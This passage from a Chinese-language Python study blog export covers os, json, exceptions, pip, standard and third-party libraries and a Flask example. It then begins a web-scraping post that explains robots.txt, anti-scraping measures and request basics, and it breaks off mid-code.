id="3-os模块和os-path模块"><a href="#3-os模块和os-path模块" class="headerlink" title="3 os模块和os.path模块"></a>3 os模块和os.path模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#os.path</span></span><br><span class="line"><span class="comment"># 返回path绝对路径</span></span><br><span class="line">abspath( path )</span><br><span class="line"><span class="comment"># 返回path的目录</span></span><br><span class="line">dirname( path )</span><br><span class="line"><span class="comment"># path存在返回True否则False</span></span><br><span class="line">exists( path )</span><br><span class="line"><span class="comment"># 返回path最后存取时间</span></span><br><span class="line">getatime( path )</span><br><span class="line"><span class="comment"># 返回path最后修改时间</span></span><br><span class="line">getmtime( path )</span><br><span class="line"><span class="comment"># 返回path文件的大小（字节）</span></span><br><span class="line">getsize( path )</span><br><span class="line"><span class="comment"># path是否是绝对路径</span></span><br><span class="line">isabs( path )</span><br><span class="line"><span class="comment"># path是否是一个存在的目录</span></span><br><span class="line">isdir( path )</span><br><span class="line"><span class="comment"># path是否是一个存在的文件</span></span><br><span class="line">isfile( path )</span><br><span class="line"><span class="comment"># 将path分割成目录和文件名二元组返回</span></span><br><span class="line">split( path )</span><br><span class="line"><span class="comment"># 分离文件路径和扩展名</span></span><br><span class="line">splitext( path )</span><br><span class="line"><span class="comment"># 路径拼接</span></span><br><span class="line">join( <span class="built_in">str</span> , ... )</span><br><span class="line"></span><br><span class="line"><span class="comment"># os</span></span><br><span class="line"><span class="comment"># 当前Python脚本工作的路径</span></span><br><span class="line">os.getcwd()</span><br><span class="line"><span class="comment"># 返回指定目录下的所有文件和目录名</span></span><br><span class="line">os.listdir( path )</span><br><span class="line"><span class="comment"># 删除参数file指定的文件</span></span><br><span class="line">os.remove( file )</span><br><span class="line"><span class="comment"># 删除指定目录</span></span><br><span class="line">os.removedirs( path )</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">os.rename( old , new )</span><br><span class="line"><span class="comment"># 创建单个目录</span></span><br><span class="line">os.mkdir( path )</span><br><span class="line"><span class="comment"># 获得文件属性</span></span><br><span class="line">os.stat( path )</span><br></pre></td></tr></table></figure><h3 id="4-CSV格式读写数据"><a href="#4-CSV格式读写数据" class="headerlink" title="4 CSV格式读写数据"></a>4 CSV格式读写数据</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br></pre></td></tr></table></figure><h3 id="5-序列化"><a href="#5-序列化" class="headerlink" title="5 序列化"></a>5 序列化</h3><ul><li><p>序列化：把复杂的数据结构变成一连串的字节</p></li><li><p>反序列化：把一连串的字节变成复杂的数据结构</p></li><li><p>简单的数据结构存入，例如：列表，字典等：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 写（获取的数据中有中文，设置ascii存储关闭，否则默认true）</span></span><br><span class="line">json.dump( data , fp , ensure_ascii=<span class="literal">False</span> )</span><br><span class="line"><span class="comment"># 读</span></span><br><span class="line">json.load( fp )</span><br><span class="line"><span class="comment"># 字符串变json</span></span><br><span class="line">res = json.loads( <span class="built_in">str</span> )</span><br></pre></td></tr></table></figure></li><li><p>类的存入：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="八、异常"><a href="#八、异常" class="headerlink" title="八、异常"></a>八、异常</h2><h3 id="1-异常流程"><a href="#1-异常流程" class="headerlink" title="1 异常流程"></a>1 异常流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可能会生成异常的代码段</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># 生成异常后的处理（异常名，多个用括号括起）（异常描述存在e中）</span></span><br><span class="line"><span class="keyword">except</span> [ ExceptionName ] [ <span class="keyword">as</span> e ]:</span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span> [ ExceptionName ]: </span><br><span class="line"><span class="comment"># 未发生异常时执行的代码段</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment"># 无论是否发生异常都执行的代码段</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br></pre></td></tr></table></figure><h3 id="2-异常类型"><a href="#2-异常类型" class="headerlink" title="2 异常类型"></a>2 异常类型</h3><blockquote><p>Exception：所有异常<br>BaseExcpettion：所有异常的根异常<br>GeneratorExit： 由生成器.close()方法引发<br>KeyboardInterrupt：由键盘中断（通常为Ctrl+C) 生成<br>SystemExit： 程序退出/终止<br>Exception： 所有非退出异常的基类<br>StopIteration： 引发后可停止迭代<br>StandardError ：所有内置异常的基类（仅在Python2中使用）<br>ArithmeticError ：算数异常的基类<br>FloatingPointError：浮点操作失败<br>ZeorDivisionError ：对0进行除或取模操作<br>AssertionError： 由assert语句引发<br>AttributeError ：当属性名称无效时引发<br>EnviromentError： 发生在Python外部的错误<br>IOError：I/O或文件相关的错误<br>OSError ：操作系统错误<br>EOFError ：到达文件结尾时引发<br>ImportError ：import语句失败<br>LookupError ：索引和键错误<br>IndexError ：超出序列索引的范围<br>KeyError ：字键盘不存在<br>MemoryError： 内存不足<br>NameError ：无法找到局部或全局名称<br>UnboundLocalError：未绑定的局部变量<br>ReferenceError：销毁被引用对象后使用的弱引用<br>RuntimeError ：一般运行时错误<br>NotImplementedError：没有实现的特性<br>SystaxError ：解析错误<br>IndentationError： 缩进错误<br>TabError ：使用不一致的制表符（由-tt选项生成）<br>SystemError： 解释器中的非致命系统错误<br>TypeError： 给操作传递了错误的类型<br>ValueError ：无效类型<br>UnicodeError： Unicode错误<br>UnicodeDecondeError： Unicode解码错误<br>UnicodeEncodeError ：Unicode编码错误<br>UnicodeTranslateError：Unicode转换错误<br>Warning：警告的基类<br>DeprecationWarning：关于被弃用的特征的警告<br>FutureWarning：关于构造将来语义会有改变的警告<br>OverflowWarning：旧的关于自动提升为长整型(long)的警告<br>PendingDeprecationWarning：关于特性将会被废弃的警告<br>RuntimeWarning：可疑的运行时行为(runtime behavior)的警告<br>SyntaxWarning：可疑的语法的警告<br>UserWarning：用户代码生成的警告</p></blockquote><h3 id="3-抛出异常"><a href="#3-抛出异常" class="headerlink" title="3 抛出异常"></a>3 抛出异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># raise 异常类名[ , 异常描述 ]</span></span><br><span class="line"><span class="comment"># raise 不带参数抛出刚刚抛出的异常</span></span><br><span class="line"><span class="keyword">raise</span> [Exception [, args [, traceback]]]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-断言"><a href="#4-断言" class="headerlink" title="4 断言"></a>4 断言</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># assert（断言）用于判断一个表达式，在表达式条件为 false 的时候触发异常。</span></span><br><span class="line"><span class="keyword">assert</span> expression [, arguments]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断系统是否为Linux:</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&#x27;linux&#x27;</span> <span class="keyword">in</span> sys.platform), <span class="string">&quot;该代码只能在 Linux 下执行&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断系统是否为 win32:</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">assert</span> (<span class="string">&#x27;win32&#x27;</span> <span class="keyword">in</span> sys.platform), <span class="string">&quot;win32&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-自定义异常"><a href="#5-自定义异常" class="headerlink" title="5 自定义异常"></a>5 自定义异常</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserDefinedException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, eid, message</span>):</span><br><span class="line">    self.eid = eid</span><br><span class="line">    self.message = message</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExceptionDemo</span> :</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">self, number</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;called compute(&quot;</span> + <span class="built_in">str</span>(number) + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> number &gt; <span class="number">500</span> <span class="keyword">or</span> number &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> UserDefinedException(<span class="number">101</span>, <span class="string">&quot;number out of bounds&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;normal exit&quot;</span>)</span><br><span class="line">myobject = ExceptionDemo()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    myobject.draw(<span class="number">125</span>)</span><br><span class="line">    myobject.draw(<span class="number">900</span>)</span><br><span class="line"><span class="keyword">except</span> UserDefinedException <span class="keyword">as</span> e :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception caught,id:&#123;&#125;,message:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(e.eid, e.message))</span><br></pre></td></tr></table></figure><hr><h2 id="九、导入包"><a href="#九、导入包" class="headerlink" title="九、导入包"></a>九、导入包</h2><h3 id="1-包定义"><a href="#1-包定义" class="headerlink" title="1 包定义"></a>1 包定义</h3><blockquote><p>包中含有模块。（文件夹（包）里有 <strong> init</strong>.py（初始化文件），hello.py（模块））</p><p>模块中含有函数库和类库。（函数和类）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单独运行</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;main&quot;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 作为模块被调用</span></span><br><span class="line"><span class="keyword">elif</span> __name__ == <span class="string">&quot;module_name&quot;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="2-pip指令"><a href="#2-pip指令" class="headerlink" title="2 pip指令"></a>2 pip指令</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">pip &lt; command &gt; [ options ]</span><br><span class="line"></span><br><span class="line">pip -<span class="built_in">help</span>：帮助</span><br><span class="line">pip install name：安装包</span><br><span class="line">pip uninstall name：卸载包</span><br><span class="line">pip show name：查看包</span><br><span class="line">pip download name：下载但不安装包</span><br><span class="line">pip list：查看所有安装包</span><br></pre></td></tr></table></figure><ul><li><p>使用豆瓣的镜像进行升级</p><p><code>python -m pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com</code></p></li><li><p>pip 安装    <a href="https://pypi.org/project/pip/#files">official::安装</a></p></li><li><p>setuptools 安装    <a href="https://pypi.org/project/setuptools/">official::安装</a></p></li><li><p><a href="https://www.runoob.com/w3cnote/pip-cn-mirror.html">镜像源</a> </p><ul><li>清华：<a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li>中国科学技术大学 : <a href="https://pypi.mirrors.ustc.edu.cn/simple">https://pypi.mirrors.ustc.edu.cn/simple</a></li><li>豆瓣：<a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></li><li>阿里云：<a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></li></ul></li></ul><h3 id="3-导入包"><a href="#3-导入包" class="headerlink" title="3 导入包"></a>3 导入包</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 库 [ <span class="keyword">as</span> alias ]</span><br><span class="line"><span class="keyword">from</span> 库 <span class="keyword">import</span> 函数</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重命名list为List</span></span><br><span class="line"><span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">list</span> <span class="keyword">as</span> <span class="type">List</span></span><br></pre></td></tr></table></figure><h3 id="4-打包"><a href="#4-打包" class="headerlink" title="4 打包"></a>4 打包</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/380183243">链接</a></p></blockquote><h3 id="5-生成可执行文件"><a href="#5-生成可执行文件" class="headerlink" title="5 生成可执行文件"></a>5 生成可执行文件</h3><blockquote><p><a href="https://www.cnblogs.com/gopythoner/p/6337543.html">链接</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">pip install PyInstaller</span><br><span class="line"></span><br><span class="line"># 普通打包</span><br><span class="line">pyinstaller -F myfile.py</span><br><span class="line">-i ico：装载图标（linux不行）</span><br><span class="line"></span><br><span class="line"># 窗口化应用程序作为单文件可执行文件</span><br><span class="line">pyinstaller --onefile --windowed myfile.py</span><br></pre></td></tr></table></figure><h3 id="6-标准库"><a href="#6-标准库" class="headerlink" title="6 标准库"></a>6 标准库</h3><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/index.html">official::大全</a></p></blockquote><h4 id="6-1-do-cmd"><a href="#6-1-do-cmd" class="headerlink" title="6.1 do_cmd"></a>6.1 do_cmd</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">cmd = <span class="string">&#x27;ipconfig /all&#x27;</span></span><br><span class="line">res = os.popen( cmd )</span><br><span class="line">output_str = res.buffer.read().decode( encoding=<span class="string">&#x27;GB2312&#x27;</span> )</span><br><span class="line"><span class="built_in">print</span>( output_str )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">obj = subprocess.run( </span><br><span class="line">cmd,</span><br><span class="line">stdin=subprocess.PIPE,</span><br><span class="line">stdout=subprocess.PIPE,</span><br><span class="line">stderr=subprocess.PIPE,</span><br><span class="line">universal_newlines=<span class="literal">True</span>,</span><br><span class="line">timeout=<span class="number">1</span> )</span><br><span class="line"><span class="built_in">print</span>( obj.stderr )  <span class="comment"># 输出异常信息</span></span><br><span class="line"><span class="built_in">print</span>( obj.stdout )  <span class="comment"># 程序没有异常，只输出空行</span></span><br></pre></td></tr></table></figure><h4 id="6-2-math"><a href="#6-2-math" class="headerlink" title="6.2 math"></a>6.2 math</h4><blockquote><p> <a href="https://www.runoob.com/python3/python-math.html">math库</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 排列</span></span><br><span class="line">math.perm( m , n ) == A( m , n )（例：A( <span class="number">5</span> , <span class="number">3</span> ) 为 <span class="number">5</span> * <span class="number">4</span> * <span class="number">3</span>）</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">math.comb( m , n ) == C( m , n )</span><br><span class="line"><span class="comment"># 求质</span></span><br><span class="line">math.gcd( m , n )</span><br></pre></td></tr></table></figure><h4 id="6-3-random"><a href="#6-3-random" class="headerlink" title="6.3 random"></a>6.3 random</h4><blockquote><p><a href="https://www.runoob.com/python3/python-random.html">random库</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># [ start , end )</span></span><br><span class="line">random.randrange( start , end , step )</span><br></pre></td></tr></table></figure><h4 id="6-4-datetime"><a href="#6-4-datetime" class="headerlink" title="6.4 datetime"></a>6.4 datetime</h4><blockquote><p> <a href="https://www.cnblogs.com/huigebj/p/11259449.html">datetime库①</a>    <a href="https://zhuanlan.zhihu.com/p/208291869">datetime库②</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 今日的日期</span></span><br><span class="line">datetime.date.today()</span><br><span class="line"><span class="comment"># 使用时间戳创建日期</span></span><br><span class="line">datetime.date.fromtimestamp(num) </span><br><span class="line"><span class="comment"># 使用公历序数创建的日期</span></span><br><span class="line">datetime.date.fromordinal(num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间推移(days,seconds)</span></span><br><span class="line">datetime.timedelta(days=num)</span><br></pre></td></tr></table></figure><h4 id="6-5-turtle"><a href="#6-5-turtle" class="headerlink" title="6.5 turtle"></a>6.5 turtle</h4><blockquote><p><a href="https://docs.python.org/zh-cn/3.7/library/turtle.html">turtle库</a></p></blockquote><h4 id="6-6-tkinter-GUI"><a href="#6-6-tkinter-GUI" class="headerlink" title="6.6 tkinter GUI"></a>6.6 tkinter GUI</h4><blockquote><p> <a href="https://www.runoob.com/python/python-gui-tkinter.html">tkinter GUI库</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line">t = turtle.Turtle()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬行</span></span><br><span class="line">forward(n); backward(n) <span class="comment"># n：距离</span></span><br><span class="line"><span class="comment"># 转向</span></span><br><span class="line">left(a);right(a) <span class="comment"># a：角度</span></span><br><span class="line"><span class="comment"># 抬笔放笔</span></span><br><span class="line">penup();pendown()</span><br><span class="line"><span class="comment"># 笔属性</span></span><br><span class="line">pensize(s); pencolor(c)</span><br><span class="line"><span class="comment"># 隐藏箭头</span></span><br><span class="line">hideturtle()</span><br><span class="line"><span class="comment"># 结束作图</span></span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure><h4 id="6-7-hashlib"><a href="#6-7-hashlib" class="headerlink" title="6.7 hashlib"></a>6.7 hashlib</h4><ul><li><p>hashlib</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 使用加密函数</span></span><br><span class="line">hashlib.func()</span><br><span class="line"><span class="comment"># func:md5,hash256,...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单使用</span></span><br><span class="line">obj = hashlib.md5()</span><br><span class="line"><span class="comment"># 编码，或者obj.update(b&quot;Hello&quot;)</span></span><br><span class="line">obj.update(<span class="string">&quot;Hello&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="comment"># 十六进制</span></span><br><span class="line"><span class="built_in">print</span>(obj.hexdigest())</span><br></pre></td></tr></table></figure></li><li><p>hmac</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 密钥，待加密字符串，加密hash函数</span></span><br><span class="line">mac = hmac.new(<span class="string">b&#x27;key&#x27;</span>,<span class="string">b&#x27;hello&#x27;</span>,hashlib.md5)</span><br><span class="line"><span class="comment"># 字符串的ascii码</span></span><br><span class="line"><span class="built_in">print</span>(mac.digest()) </span><br><span class="line"><span class="built_in">print</span>(mac.hexdigest()) </span><br></pre></td></tr></table></figure></li></ul><h4 id="6-8-结构化"><a href="#6-8-结构化" class="headerlink" title="6.8 结构化"></a>6.8 结构化</h4><ul><li><p>stuct</p><blockquote><p><a href="https://blog.csdn.net/qq_30638831/article/details/80421019">struct详解</a></p><p>常用 fmt：</p><ul><li>i：int型</li></ul></blockquote></li></ul><div class="table-container"><table><thead><tr><th>function</th><th>return</th><th>explain</th></tr></thead><tbody><tr><td>pack(fmt,v1,v2,…)</td><td>string</td><td>按格式把数据转化成字节流</td></tr><tr><td>pack(fmt,buffer,offset,v1,v2,…)</td><td>None</td><td>写入以offset开始的buffer中</td></tr><tr><td>unpack(fmt,v1,v2,…)</td><td>tuple</td><td>解包</td></tr><tr><td>pack_from(fmt,buffer,offset)</td><td>tuple</td><td>以offset开始解包</td></tr><tr><td>calcsize(fmt)</td><td>size of fmt</td><td>计算fmt占多少字节</td></tr></tbody></table></div><ul><li><p>json</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h4 id="6-9-Urllib"><a href="#6-9-Urllib" class="headerlink" title="6.9 Urllib"></a>6.9 Urllib</h4><h4 id="6-10-itertools"><a href="#6-10-itertools" class="headerlink" title="6.10 itertools"></a>6.10 itertools</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="comment"># 迭代生成数字，start，step，__next__获得下一个数</span></span><br><span class="line">itertools.count(start=<span class="number">0</span>,step=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="7-三方库"><a href="#7-三方库" class="headerlink" title="7 三方库"></a>7 三方库</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/237294427">库导入</a></p></blockquote><h4 id="7-1-pygame"><a href="#7-1-pygame" class="headerlink" title="7.1 pygame"></a>7.1 pygame</h4><blockquote><p><a href="https://blog.csdn.net/cainiao_python/article/details/123267231">导弹追踪</a></p></blockquote><h4 id="7-2-pymssql"><a href="#7-2-pymssql" class="headerlink" title="7.2 pymssql"></a>7.2 pymssql</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">con = pymsssql.Connect( host , port , user , password , db )</span><br><span class="line"><span class="comment"># 创建游标</span></span><br><span class="line">cursor = con.cursor()</span><br><span class="line"><span class="comment"># 执行 sql 语句</span></span><br><span class="line">cursor.execute( <span class="string">&#x27; sql &#x27;</span> )</span><br><span class="line"><span class="comment"># 数据提交</span></span><br><span class="line">con.commit()</span><br><span class="line"><span class="comment"># 回滚</span></span><br><span class="line">con.rollback()</span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">cursor / con.close()</span><br></pre></td></tr></table></figure><ul><li><strong>流程</strong><ol><li>链接数据库。</li><li>新建游标。</li><li>执行 sql 操作，用 try，except，无异常数据提交，有异常回滚。</li><li>关闭数据库。</li></ol></li></ul><h4 id="7-3-jieba"><a href="#7-3-jieba" class="headerlink" title="7.3 jieba"></a>7.3 jieba</h4><blockquote><p><a href="https://github.com/fxsjy/jieba">jieba库</a></p></blockquote><h4 id="7-4-cloudwords"><a href="#7-4-cloudwords" class="headerlink" title="7.4 cloudwords"></a>7.4 cloudwords</h4><blockquote><p><a href="https://www.cnblogs.com/snailclimb/p/9086436.html">cloudwords库</a></p></blockquote><h4 id="7-5-flask"><a href="#7-5-flask" class="headerlink" title="7.5 flask"></a>7.5 flask</h4><blockquote><p><a href="https://www.cnblogs.com/cleven/p/10858016.html">Flask Web</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 主网页</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_main</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"><span class="comment"># 子网页</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bobo&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_bobo</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello bobo&#x27;</span></span><br><span class="line"><span class="comment"># 错误</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_error</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;page not found&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"><span class="comment"># 非局域网访问</span></span><br><span class="line"><span class="comment"># app.run(debug=True,host=&#x27;0.0.0.0&#x27;,port=5000)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 打开外部html（文件必须在templates文件夹下）</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_main</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;site.html&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="7-6-Django"><a href="#7-6-Django" class="headerlink" title="7.6 Django"></a>7.6 Django</h4><hr><h2 id="十、协程"><a href="#十、协程" class="headerlink" title="十、协程"></a>十、协程</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># async定义一个协程</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line"></span><br><span class="line"><span class="comment">#await用来挂起阻塞方法的执行</span></span><br><span class="line"><span class="keyword">await</span> func();</span><br></pre></td></tr></table></figure><hr><h2 id="十一、高级用法"><a href="#十一、高级用法" class="headerlink" title="十一、高级用法"></a>十一、高级用法</h2><ul><li><a href=".\9898eb96">text::PyQt5</a></li><li><a href=".\c386cf1b">text::Python爬虫</a> </li><li><a href=".\2810fc66">text::Python渗透</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 程序语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫</title>
      <link href="/posts/c386cf1b.html"/>
      <url>/posts/c386cf1b.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫"><a href="#Python爬虫" class="headerlink" title="Python爬虫"></a>Python爬虫</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p><p><a href=".\9ce61be">text::Html+CSS</a> </p><p><a href=".\e255a10a">text::计算机网络</a> </p></blockquote><hr><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-爬虫防抓"><a href="#1-爬虫防抓" class="headerlink" title="1 爬虫防抓"></a>1 爬虫防抓</h3><ol><li>严格遵守网站设置的robots协议。</li><li>在规避反爬虫措施的同时，需要优化自己的代码，避免干扰被访问网站的正常运行。</li><li>在设置抓取策略时，应注意编码抓取视频、音乐等可能构成作品的数据，或者针对某些特定网站批量抓取其中的用户生成内容。</li><li>在使用、传播抓取到的信息时，应审查所抓取的内容，如发现属于用户的个人信息、隐私或者他人的商业秘密的，应及时停止并删除。</li></ol><h3 id="2-爬虫分类"><a href="#2-爬虫分类" class="headerlink" title="2 爬虫分类"></a>2 爬虫分类</h3><ul><li><p>通用爬虫</p><blockquote><p>抓取系统重要组成部分，抓取的是一整张页面。</p></blockquote><ol><li>指定url</li><li>发起请求</li><li>获取响应数据</li><li>持久化存储</li></ol></li><li><p>聚焦爬虫</p><blockquote><p>建立在通用爬虫基础之上，抓取的是页面特定的局部内容。</p></blockquote><ol><li>指定url</li><li>发起请求</li><li>获取响应数据</li><li>数据解析</li><li>持久化存储</li></ol></li><li><p>增量式爬虫</p><blockquote><p>监测网站中数据更新的情况，只会抓取网站更新出来的数据。</p></blockquote></li></ul><h3 id="3-反爬机制与反反爬策略"><a href="#3-反爬机制与反反爬策略" class="headerlink" title="3 反爬机制与反反爬策略"></a>3 反爬机制与反反爬策略</h3><ul><li><p>反爬机制</p><ul><li><p>robots.txt协议</p><blockquote><p><a href="https://baike.sogou.com/v62040012.htm?fromTitle=robots.txt">robots协议</a></p><p>君子协议。规定了网站中哪些数据可以被爬取，哪些数据不可以被爬取。（没有强制限定)</p></blockquote><p><img src="/posts/c386cf1b/robots.jpg" alt="img"></p></li><li><p>UA检测：检测身份</p><blockquote><p>门户网站会检测请求载体的身份，若不是基于某一浏览器的，则表示该请求不正常，服务器很可能会拒绝该次请求。</p></blockquote></li><li><p>IP封锁</p><blockquote><p>封锁IP。</p></blockquote></li></ul></li><li><p>反反爬策略</p><ul><li><p>UA伪装：伪装成某一浏览器</p><blockquote><p>具体：requests库——UA伪装。</p></blockquote></li><li><p>代理：解决IP封锁问题</p></li></ul></li></ul><hr><h2 id="二、数据爬取"><a href="#二、数据爬取" class="headerlink" title="二、数据爬取"></a>二、数据爬取</h2><h3 id="1-requests库定义"><a href="#1-requests库定义" class="headerlink" title="1 requests库定义"></a>1 requests库定义</h3><ul><li>定义：Python中原生的一款基于网络请求的模块。</li><li>作用：模拟浏览器发送请求。</li></ul><h3 id="2-简单流程"><a href="#2-简单流程" class="headerlink" title="2 简单流程"></a>2 简单流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、指定url</span></span><br><span class="line">url = <span class="string">&quot;https://123.sogou.com/&quot;</span></span><br><span class="line"><span class="comment"># 2、发起请求</span></span><br><span class="line">response =  requests.get(url=url)</span><br><span class="line"><span class="comment"># 3、获取响应数据</span></span><br><span class="line">page_text = response.text</span><br><span class="line"><span class="built_in">print</span>(page_text)</span><br><span class="line"><span class="comment"># 4、持久化存储</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./save.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(page_text)</span><br></pre></td></tr></table></figure><h3 id="3-浏览器带参搜索"><a href="#3-浏览器带参搜索" class="headerlink" title="3 浏览器带参搜索"></a>3 浏览器带参搜索</h3><blockquote><p><a href="https://cloud.tencent.com/developer/article/1648157">get与post参数</a>   </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典封装</span></span><br><span class="line">param = &#123;<span class="string">&quot;query&quot;</span>:value&#125;</span><br><span class="line"><span class="comment"># 自动处理参数：请求参数</span></span><br><span class="line">response = requests.get( params = param )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 